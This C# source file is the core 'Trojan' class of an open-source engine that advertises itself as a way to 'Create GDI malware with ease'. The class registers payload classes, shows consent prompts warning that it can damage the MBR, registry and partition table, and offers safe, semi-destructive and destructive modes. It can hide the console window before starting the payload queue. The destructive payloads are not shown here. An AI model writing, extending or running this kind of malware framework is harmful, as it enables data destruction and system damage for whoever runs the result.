// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using PInvoke;
using Spectre.Console;
using TheAirBlow.Zigman.Exceptions;
using Color = Spectre.Console.Color;
using Panel = Spectre.Console.Panel;

namespace TheAirBlow.Zigman;

public class Trojan
{
    /// <summary>
    /// Automatically hide the console window
    /// as the payloads get started.
    /// </summary>
    public bool HideConsoleWindow;

    /// <summary>
    /// Author's Name
    /// </summary>
    public string Author;

    /// <summary>
    /// Project's Title
    /// </summary>
    public string Title;

    /// <summary>
    /// Safety level
    /// </summary>
    private SafetyLevel SafetyLevel;

    /// <summary>
    /// Amount of threads
    /// </summary>
    private int ThreadsCount;

    /// <summary>
    /// Threads manager
    /// </summary>
    private ThreadsManager _manager;

    /// <summary>
    /// Payloads class
    /// </summary>
    private List<Payloads> _payloads = new();

    /// <summary>
    /// Did this instance already start?
    /// </summary>
    private bool _started;

    /// <summary>
    /// Register a Payloads class
    /// </summary>
    /// <typeparam name="T">Type</typeparam>
    public void RegisterClass<T>()
    {
        if (!typeof(T).IsSubclassOf(typeof(Payloads)))
            throw new InvalidClassException($"{typeof(T).Name} does not inherit from Payloads!");
        var instance = (Payloads)Activator.CreateInstance(typeof(T))!;
        _payloads.Add(instance);
    }

    /// <summary>
    /// Start up the Engine
    /// </summary>
    public void Run()
    {
        if (_started)
            throw new InvalidOperationException("Cannot run the Zigman Engine: " +
                                                "it is already running at this time!");
        _started = true; var first = _payloads[0];
        
        // Spectre.Console, thank you, very cool!
        var panel = new Panel(new FigletText(Title).LeftAligned().Color(Color.Green).Centered()) {
            Header = new PanelHeader($"[dodgerblue2]$ Created by the only [deepskyblue2]{Author}[/] $[/]", Justify.Center),
            Border = BoxBorder.Rounded, Expand = false
        };
        AnsiConsole.Write(panel);
        AnsiConsole.MarkupLine("[dodgerblue2]Powered by [deepskyblue2]https://github.com/TheAirBlow/Zigman[/] made by TheAirBlow! " +
                               "Create GDI malware with ease and everyting ready to go! Completely Open-Source with examples![/]");
        AnsiConsole.MarkupLine($"[bold yellow]HEYA![/] [red underline]This is a malware[/] that can [red underline]damage " +
                               $"the MBR, Registry and the Partition Table[/]. [bold underline]We are not responsible for any damages " +
                               $"caused by using this software, and any of it's altered versions.[/]");
        if (!AnsiConsole.Confirm("Do you understand and agree with this?", false)) {
            AnsiConsole.MarkupLine($"[Green]Okay then![/] The window would close in a few seconds.");
            Thread.Sleep(2000); return;
        }
        
        AnsiConsole.MarkupLine($"You [green underline]can disable destructive payloads[/], but " +
                               $"[yellow underline]the developers could've just put the wrong Safety Level[/]. It's completely up to you " +
                               $"if you would [yellow underline]trust the Author[/] of this malware.");
        if (!AnsiConsole.Confirm("Do you understand and agree with this?", false)) {
            AnsiConsole.MarkupLine($"[Green]Okay then![/] The window would close in a few seconds.");
            Thread.Sleep(2000); return;
        }
        
        AnsiConsole.MarkupLine($"[Green]Okay then![/] Let's begin our journey.");
        ThreadsCount = AnsiConsole.Ask("How much threads should be used?", 4);
        _manager = new(ThreadsCount);
        var safetyLevel = AnsiConsole.Prompt(
            new SelectionPrompt<string>()
                .Title("[dodgerblue2]Choose the [bold]Safety Level[/]![/]")
                .AddChoices("Completely Safe", "Semi-Destructive", "Destructive"));
        switch (safetyLevel) {
            case "Completely Safe":
                SafetyLevel = SafetyLevel.Safe;
                break;
            case "Semi-Destructive":
                SafetyLevel = SafetyLevel.SemiDestructive;
                break;
            case "Destructive":
                SafetyLevel = SafetyLevel.Destructive;
                break;
        }
        
        AnsiConsole.MarkupLine("Please check that your settings are right:");
        AnsiConsole.MarkupLine($"Safety Level: {safetyLevel}");
        AnsiConsole.MarkupLine($"Threads Count: {ThreadsCount}");
        if (!AnsiConsole.Confirm("Do you want to continue?", false)) {
            AnsiConsole.MarkupLine($"[Green]Okay then![/] The window would close in a few seconds.");
            Thread.Sleep(2000); return;
        }
        
        AnsiConsole.MarkupLine($"[Green]Okay then![/] Get ready for destruction!");
        
        // Hide the console's window if neccerary
        if (HideConsoleWindow) User32.ShowWindow(Kernel32.GetConsoleWindow(), 0);
        
        // Setup
        first.SetSettings(_manager, SafetyLevel);
        first.Initialize(_payloads.Count == 0 ? null
            : _payloads.Select(x => x.GetType()).ToList());
        first.StartQueue();
        
        // Wait for shutdown
        while(!_manager.ShutdownDone) {}
    }
}